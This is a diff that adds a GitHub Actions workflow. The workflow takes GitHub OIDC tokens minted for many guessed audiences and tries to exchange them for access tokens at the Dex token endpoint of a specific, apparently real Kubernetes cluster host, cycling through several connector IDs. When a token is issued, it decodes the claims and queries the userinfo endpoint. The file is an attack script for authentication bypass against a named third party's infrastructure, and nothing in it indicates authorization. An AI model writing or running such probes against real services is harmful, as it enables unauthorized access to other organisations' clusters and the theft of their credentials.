@@ -1,0 +1,50 @@
+name: oidc-dex-probe
+on: workflow_dispatch
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    env:
+      DEX: https://dex.3209e979-k8s.cloud.together.ai
+    steps:
+      - name: probe dex token exchange with real GH OIDC token
+        run: |
+          python3 - <<'PY' > /tmp/claims.py.out 2>&1 || true
+          print("noop")
+          PY
+          for AUD in "https://dex.3209e979-k8s.cloud.together.ai" "together" "together-ai" "kubernetes" "together-cli" "dex" "https://api.together.ai" "sts.together.ai" "https://together.ai"; do
+            RESP=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
+            TOK=$(printf '%s' "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
+            echo "===== AUD=$AUD tokenlen=${#TOK}"
+            printf '%s' "$TOK" | python3 -c 'import sys,base64,json
+t=sys.stdin.read().strip().split(".")
+def d(s): return json.loads(base64.urlsafe_b64decode(s+"="*(-len(s)%4)))
+if len(t)==3:
+  print("  GH-HDR:", json.dumps(d(t[0])))
+  p=d(t[1]); print("  GH-ISS:", p.get("iss"), "| GH-SUB:", p.get("sub"), "| GH-AUD:", p.get("aud"), "| OWNER:", p.get("repository_owner"))' 2>/dev/null
+            for CID in github-actions cursor-cloud okta; do
+              R=$(curl -s -m 20 -X POST "$DEX/token" \
+                --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+                --data-urlencode "subject_token=$TOK" \
+                --data-urlencode "subject_token_type=urn:ietf:params:oauth:token-type:id_token" \
+                -d "client_id=kubernetes" -d "connector_id=$CID")
+              SHORT=$(printf '%s' "$R" | head -c 160)
+              echo "  Dex[$CID]: $SHORT"
+              if printf '%s' "$R" | grep -q '"access_token"'; then
+                echo "  !!! TOKEN ISSUED by connector $CID with audience $AUD"
+                printf '%s' "$R" > /tmp/tok.json
+                python3 -c 'import json,base64
+r=json.load(open("/tmp/tok.json"))
+t=r.get("access_token","").split(".")
+def d(s): return json.loads(base64.urlsafe_b64decode(s+"="*(-len(s)%4)))
+if len(t)==3:
+  print("  DEX-HDR:", json.dumps(d(t[0])))
+  print("  DEX-CLAIMS:", json.dumps(d(t[1])))'
+                echo "  userinfo check:"
+                curl -s -m 15 "$DEX/userinfo" -H "Authorization: Bearer $(python3 -c 'import json;print(json.load(open("/tmp/tok.json"))["access_token"])')" | head -c 400
+                echo
+              fi
+            done
+          done
